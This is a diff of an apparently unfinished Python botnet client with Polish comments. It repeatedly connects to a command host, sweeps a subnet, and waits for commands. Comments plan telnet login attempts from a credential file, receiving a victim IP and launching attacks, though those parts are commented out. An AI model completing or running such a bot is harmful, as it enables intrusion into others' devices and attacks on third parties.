@@ -30,7 +30,7 @@ def checkForOtherDevices(ip):
         current_address = ip + str(x)
         # telnetConnect(current_address)
         x += 1
-        print(current_address)
+        # print(current_address)
         # próbuj połączyć z każdym przez telnet używając pliku z loginem i hasłem
 
 
@@ -46,20 +46,33 @@ if __name__ == '__main__':
             while flag != 1:
                 time.sleep(0.5)
                 try:
+                    print('próba połączenia')
                     s.connect((HOST, PORT))
+                    checkForOtherDevices(HOST)
                     flag = 1
                 except:
+                    print('nie udało sie połączyć')
                     flag = 0
                     continue
 
-            checkForOtherDevices(HOST)
             # while True: czekaj na dane
             # s.sendall(b'Beginn attack')
-            data = s.recv(1024)
-            if data == 1:
-                victim_ip = s.recv(1024)
-            if data == 2:
-                HOST = s.recv(1024)
+            try:
+                data = str(s.recv(1024).decode())
+                print('Received', str(data), 'fsfs')
+                if str(data) == '11':
+                    print('coś przyszło' + data)
+
+                    # victim_ip = s.recv(1024)
+                    s.sendall('ok'.encode())
+                elif data == 2:
+                    HOST = s.recv(1024)
+                    s.close()
+                else:
+                    print('cos jest zle')
+            except:
+                flag = 0
+                continue
             # wyślij swój adres ip przy:
             # - każdym połączeniu
             # - po każdym ataku
@@ -68,4 +81,4 @@ if __name__ == '__main__':
             # print('public IP address: {}'.format(ip))
             # print('operating port: {}'.format(PORT))
 
-            print('Received', repr(data))
+            print('Received', str(data))
